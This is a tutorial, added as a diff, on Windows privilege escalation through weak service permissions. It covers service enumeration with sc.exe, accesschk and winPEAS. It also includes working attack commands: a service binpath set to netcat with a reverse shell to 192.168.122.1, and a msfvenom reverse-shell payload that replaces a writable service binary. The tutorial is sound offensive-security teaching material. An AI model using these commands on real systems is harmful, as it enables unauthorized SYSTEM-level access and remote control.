@@ -1,0 +1,198 @@
+                     ______________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                        Weak Service Permissions
+
+                            Leonardo Tamiano
+                     ______________________________
+
+
+Table of Contents
+_________________
+
+1. Weak Permission on Service Configuration
+2. Weak Permission on Service Binary
+3. Service Enumeration with winPEAS
+4. References
+
+
+1 Weak Permission on Service Configuration
+==========================================
+
+  We can view the configuration of a service with the `sc.exe' command.
+
+  ,----
+  | sc.exe qc SimpleService
+  `----
+
+  ,----
+  | C:\Users\Quickemu\Downloads>sc.exe qc SimpleService
+  | [SC] QueryServiceConfig SUCCESS
+  | 
+  | SERVICE_NAME: SimpleService
+  |         TYPE               : 10  WIN32_OWN_PROCESS
+  |         START_TYPE         : 3   DEMAND_START
+  |         ERROR_CONTROL      : 1   NORMAL
+  |         BINARY_PATH_NAME   : C:\Users\Quickemu\Downloads\simpleService.exe
+  |         LOAD_ORDER_GROUP   :
+  |         TAG                : 0
+  |         DISPLAY_NAME       : SimpleService
+  |         DEPENDENCIES       :
+  |         SERVICE_START_NAME : LocalSystem
+  `----
+
+  Use the `accesschk64' program to check if we have privileges over that
+  process.
+  - <https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk>
+
+  ,----
+  | .\accesschk64.exe /accepteula -uwcqv SimpleService
+  `----
+
+  ,----
+  | C:\Users\Quickemu\Downloads>.\accesschk64.exe /accepteula -uwcqv SimpleService
+  | 
+  | Accesschk v6.15 - Reports effective permissions for securable objects
+  | Copyright (C) 2006-2022 Mark Russinovich
+  | Sysinternals - www.sysinternals.com
+  | 
+  | SimpleService
+  |   Medium Mandatory Level (Default) [No-Write-Up]
+  |   RW NT AUTHORITY\SYSTEM
+  |         SERVICE_ALL_ACCESS
+  |   RW BUILTIN\Administrators
+  |         SERVICE_ALL_ACCESS
+  `----
+
+  Where the flag mean:
+
+  - `-u', show permission for a user/group
+  - `-w', show owner's access rights on the object
+  - `-c', show effective access right, taking into account any deny
+    permissions
+  - `-q', supresses any other output
+  - `-v', shows the names of all objects
+
+  We can modify the `binpath' as follows
+
+  ,----
+  | sc.exe config SimpleService binpath="C:\Users\Quickemu\Downloads\simpleService.exe"
+  | sc.exe config SimpleService binpath="C:\Users\Quickemu\Downloads\nc64.exe 192.168.122.1 4321 -e C:\Windows\system32\cmd.exe"
+  `----
+
+  A typical attack could then be:
+
+  1. We create a malicious executable that triggers a reverse shell and
+     we upload it to the victim machine
+
+     ,----
+     | msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
+     `----
+
+  2. We change the executable path of a given service
+
+     ,----
+     | sc.exe config SimpleService binpath="C:\Users\Quickemu\Downloads\malicious.exe"
+     `----
+
+  3. We stop and start the service
+
+     ,----
+     | sc.exe stop SimpleService
+     | sc.exe start SimpleService
+     `----
+
+
+2 Weak Permission on Service Binary
+===================================
+
+  Other than changing the configuration of the service, the original
+  binary itself could be configured with `weak permissions'. In these
+  situations a malicious actor can modify the binary by overwriting it
+  with a malicious binary.
+
+  First, we get the binary paths of the various processes
+  ,----
+  | PS C:\Users\Quickemu> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
+  `----
+
+  We can use the `icals' utility to check the configuration on the
+  specific binary.
+
+  ,----
+  | PS C:\Users\Quickemu\Downloads> icacls.exe .\simpleService.exe
+  `----
+
+  ,----
+  | PS C:\Users\Quickemu\Downloads> icacls.exe .\simpleService.exe
+  | .\simpleService.exe NT AUTHORITY\SYSTEM:(F)
+  |                     BUILTIN\Administrators:(F)
+  |                     QUICKEM-5QLQQP9\Quickemu:(F)
+  | 
+  | Successfully processed 1 files; Failed processing 0 files
+  `----
+
+  Notice that the user `Quickemu' has full access over the service
+  binary `simpleService.exe'. This means we can overwrite it with an
+  arbitrary binary.
+
+  To exploit, the following steps can work:
+
+  1. Generate the malicious binary and transfer it to the victim
+     machine.
+
+  ,----
+  | msfvenom -p windows/shell_reverse_tcp LHOST=192.168.122.1 LPORT=7777 -f exe -o malicious.exe
+  `----
+
+  1. Overwrite the service binary
+
+  ,----
+  | cp .\simpleService.exe .\simpleService.exe.bkp
+  | cp .\malicious.exe .\simpleService.exe
+  `----
+
+  1. Restart the service
+
+     ,----
+     | sc.exe stop SimpleService
+     | sc.exe start SimpleService
+     `----
+
+
+3 Service Enumeration with winPEAS
+==================================
+
+  We can use `winPEAS' to enumerate the service attack area:
+  - <https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS>
+
+  ,----
+  | wget https://github.com/peass-ng/PEASS-ng/releases/download/20241011-2e37ba11/winPEASx64.exe
+  `----
+
+  Use the `servicesinfo' option
+  ,----
+  | .\winPEAS.exe quiet servicesinfo
+  `----
+
+
+4 References
+============
+
+  Windows Privilege Escalation Awesome Scripts
+  <https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS>
+
+  Weak Service Permissions
+  <https://www.ired.team/offensive-security/privilege-escalation/weak-service-permissions>
+
+  Windows local privilege escalation
+  <https://xorond.com/posts/2021/04/windows-local-privilege-escalation/>
+
+  Service Misconfiguration
+  <https://www.narycyber.com/posts/privilege-escalation/windows/service-misconfigurations/>
+
+  Weak Service Permissions – Windows Privilege Escalation
+  <https://juggernaut-sec.com/weak-service-permissions-windows-privilege-escalation/>
+
+  PrivEsc: Insecure Service Permissions
+  <https://akimbocore.com/article/privilege-escalation-insecure-service-permissions/>
